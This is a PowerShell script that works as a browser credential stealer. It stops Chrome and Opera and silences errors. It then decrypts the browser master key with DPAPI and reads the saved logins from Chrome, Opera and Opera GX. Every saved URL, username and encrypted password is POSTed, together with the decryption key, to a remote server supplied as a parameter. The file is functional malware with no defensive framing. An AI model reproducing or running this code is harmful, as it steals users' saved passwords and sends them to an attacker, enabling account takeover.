function pumpndump
{
    param(
    [Parameter (Mandatory = $true)] [String]$hq
    )
    $ErrorActionPreference = 'SilentlyContinue'
# Google Chrome
    try {
        Stop-Process -Name "chrome"
        Add-Type -AssemblyName System.Security

        $chrome_path = $env:LOCALAPPDATA + "\Google\Chrome\User Data"
        $query = "SELECT origin_url, username_value, password_value FROM logins WHERE blacklisted_by_user = 0"

        $secret = Get-Content -Raw -Path $(-join($chrome_path,"\Local State")) | ConvertFrom-Json
        $secretkey = $secret.os_crypt.encrypted_key

        $cipher = [Convert]::FromBase64String($secretkey)

        $key = [Convert]::ToBase64String([System.Security.Cryptography.ProtectedData]::Unprotect($cipher[5..$cipher.length], $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser))

        Add-Type @"
            using System;
            using System.Runtime.InteropServices;
            public class WinSQLite3
            {
                const string dll = "winsqlite3";
                [DllImport(dll, EntryPoint="sqlite3_open")]
                public static extern IntPtr Open([MarshalAs(UnmanagedType.LPStr)] string filename, out IntPtr db);
                [DllImport(dll, EntryPoint="sqlite3_prepare16_v2")]
                public static extern IntPtr Prepare2(IntPtr db, [MarshalAs(UnmanagedType.LPWStr)] string sql, int numBytes, out IntPtr stmt, IntPtr pzTail);
                [DllImport(dll, EntryPoint="sqlite3_step")]
                public static extern IntPtr Step(IntPtr stmt);
                [DllImport(dll, EntryPoint="sqlite3_column_text16")]
                static extern IntPtr ColumnText16(IntPtr stmt, int index);
                [DllImport(dll, EntryPoint="sqlite3_column_bytes")]
                static extern int ColumnBytes(IntPtr stmt, int index);
                [DllImport(dll, EntryPoint="sqlite3_column_blob")]
                static extern IntPtr ColumnBlob(IntPtr stmt, int index);
                public static string ColumnString(IntPtr stmt, int index)
                { 
                    return Marshal.PtrToStringUni(WinSQLite3.ColumnText16(stmt, index));
                }
                public static byte[] ColumnByteArray(IntPtr stmt, int index)
                {
                    int length = ColumnBytes(stmt, index);
                    byte[] result = new byte[length];
                    if (length > 0)
                        Marshal.Copy(ColumnBlob(stmt, index), result, 0, length);
                    return result;
                }
                [DllImport(dll, EntryPoint="sqlite3_errmsg16")]
                public static extern IntPtr Errmsg(IntPtr db);
                public static string GetErrmsg(IntPtr db)
                {
                    return Marshal.PtrToStringUni(Errmsg(db));
                }
            }
"@


        $chrome_profiles = Get-ChildItem -Path $chrome_path | Where-Object {$_.Name -match "(Profile [0-9]|Default)"} | %{$_.FullName}



        foreach ($user_profile in $chrome_profiles)
        {
            $dbH = 0
            if([WinSQLite3]::Open($(-join($user_profile,"\Login Data")), [ref] $dbH) -ne 0) 
            {
                Write-Host "Failed to open!"
                [WinSQLite3]::GetErrmsg($dbh)
                
            }

            $stmt = 0
            if ([WinSQLite3]::Prepare2($dbH, $query, -1, [ref] $stmt, [System.IntPtr]0) -ne 0) 
            {
                Write-Host "Failed to prepare!"
                [WinSQLite3]::GetErrmsg($dbh)
               
            }

            while([WinSQLite3]::Step($stmt) -eq 100) 
            {
                $url = [WinSQLite3]::ColumnString($stmt, 0)
                $username = [WinSQLite3]::ColumnString($stmt, 1)
                $encryptedPassword = [Convert]::ToBase64String([WinSQLite3]::ColumnByteArray($stmt, 2))
                
                $params = @{"url"=$url;"username"=$username;"password"=$encryptedPassword;"key"=$key;}
                try {
                    $Response = Invoke-WebRequest -UseBasicParsing -Method POST -Uri $hq  -Body $params 
                    $decryptedPassword = $Response.Content
                    Write-Host "$url,$username,$decryptedPassword"
                }
                catch [Exception]{
                    
                }
                
                
            }

        }
    }
    catch [Exception]{
        
    }

# Opera
    try {
        Stop-Process -Name "opera"
        $opera_path = $env:APPDATA + "\Opera Software\Opera Stable"
        $query = "SELECT origin_url, username_value, password_value FROM logins WHERE blacklisted_by_user = 0"

        $secret = Get-Content -Raw -Path $(-join($opera_path,"\Local State")) | ConvertFrom-Json
        $secretkey = $secret.os_crypt.encrypted_key

        $cipher = [Convert]::FromBase64String($secretkey)

        $key = [Convert]::ToBase64String([System.Security.Cryptography.ProtectedData]::Unprotect($cipher[5..$cipher.length], $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser))


        $dbH = 0
        if([WinSQLite3]::Open($(-join($opera_path,"\Login Data")), [ref] $dbH) -ne 0) 
        {
            Write-Host "Failed to open!"
            [WinSQLite3]::GetErrmsg($dbh)
            
        }

        $stmt = 0
        if ([WinSQLite3]::Prepare2($dbH, $query, -1, [ref] $stmt, [System.IntPtr]0) -ne 0) 
        {
            Write-Host "Failed to prepare!"
            [WinSQLite3]::GetErrmsg($dbh)
           
        }

        while([WinSQLite3]::Step($stmt) -eq 100) 
        {
            $url = [WinSQLite3]::ColumnString($stmt, 0)
            $username = [WinSQLite3]::ColumnString($stmt, 1)
            $encryptedPassword = [Convert]::ToBase64String([WinSQLite3]::ColumnByteArray($stmt, 2))
            $params = @{"url"=$url;"username"=$username;"password"=$encryptedPassword;"key"=$key;}
            try {
                    $Response = Invoke-WebRequest -UseBasicParsing -Method POST -Uri $hq  -Body $params 
                    $decryptedPassword = $Response.Content
                    Write-Host "$url,$username,$decryptedPassword"
            }
            catch [Exception]{
                
            }
            
        }
    }
    catch [Exception]{
        
    }


# Opera GX
    try {

        $operagx_path = $env:APPDATA + "\Opera Software\Opera GX Stable"
        $query = "SELECT origin_url, username_value, password_value FROM logins WHERE blacklisted_by_user = 0"

        $secret = Get-Content -Raw -Path $(-join($operagx_path,"\Local State")) | ConvertFrom-Json
        $secretkey = $secret.os_crypt.encrypted_key

        $cipher = [Convert]::FromBase64String($secretkey)

        $key = [Convert]::ToBase64String([System.Security.Cryptography.ProtectedData]::Unprotect($cipher[5..$cipher.length], $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser))



        $dbH = 0
        if([WinSQLite3]::Open($(-join($operagx_path,"\Login Data")), [ref] $dbH) -ne 0) 
        {
            Write-Host "Failed to open!"
            [WinSQLite3]::GetErrmsg($dbh)
            
        }

        $stmt = 0
        if ([WinSQLite3]::Prepare2($dbH, $query, -1, [ref] $stmt, [System.IntPtr]0) -ne 0) 
        {
            Write-Host "Failed to prepare!"
            [WinSQLite3]::GetErrmsg($dbh)
           
        }

        while([WinSQLite3]::Step($stmt) -eq 100) 
        {
            $url = [WinSQLite3]::ColumnString($stmt, 0)
            $username = [WinSQLite3]::ColumnString($stmt, 1)
            $encryptedPassword = [Convert]::ToBase64String([WinSQLite3]::ColumnByteArray($stmt, 2))
            $params = @{"url"=$url;"username"=$username;"password"=$encryptedPassword;"key"=$key;}
            try {
                    $Response = Invoke-WebRequest -UseBasicParsing -Method POST -Uri $hq  -Body $params 
                    $decryptedPassword = $Response.Content
                    Write-Host "$url,$username,$decryptedPassword"
            }
            catch [Exception]{
                
            }
            
        }

    }
    catch [Exception]{
        
    }


}
